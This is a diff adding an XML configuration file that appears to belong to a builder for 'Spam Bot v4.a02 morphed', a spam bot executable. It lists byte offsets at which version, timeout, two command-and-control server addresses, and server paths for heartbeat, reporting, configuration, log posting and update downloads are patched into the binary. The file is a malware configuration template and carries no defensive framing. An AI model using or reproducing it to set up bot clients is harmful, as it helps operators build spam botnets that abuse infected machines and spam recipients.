@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<Root AppName="Spam Bot v4.a02 morphed" AppSize="unknown" ReleaseDate="10/12/2008" AppExe="out.exe" GeneralOffset="28672" OffsetMarker="services">
+  <a Name="Version:" Value="666" PatchAtPos="12" MinLength="3" MaxLength="4" Type="offset-search"/>
+  <a Name="Timeout (sec):" Value="0777" PatchAtPos="16" MinLength="1" MaxLength="4" Type="offset-search"/>
+  <a Name="Config server 1:" Value="0.0.0.0" PatchAtPos="24" MinLength="7" MaxLength="15" Type="offset-search"/>
+  <a Name="Config server 2:" Value="0.0.0.0" PatchAtPos="44" MinLength="7" MaxLength="15" Type="offset-search"/>
+  <a Name="Alive page:" Value="/spm/s_alive.php" PatchAtPos="68" MinLength="1" MaxLength="100" Type="offset-search"/>
+  <a Name="Report page:" Value="/spm/s_report.php" PatchAtPos="172" MinLength="1" MaxLength="100" Type="offset-search"/>
+  <a Name="Update path:" Value="/spm/update.exe" PatchAtPos="276" MinLength="1" MaxLength="100" Type="offset-search"/>
+  <a Name="Config script:" Value="/spm/s_config.php" PatchAtPos="556" MinLength="1" MaxLength="100" Type="offset-search"/>
+  <a Name="Post logs page:" Value="/spm/s_postlog.php" PatchAtPos="676" MinLength="1" MaxLength="100" Type="offset-search"/>
+</Root>
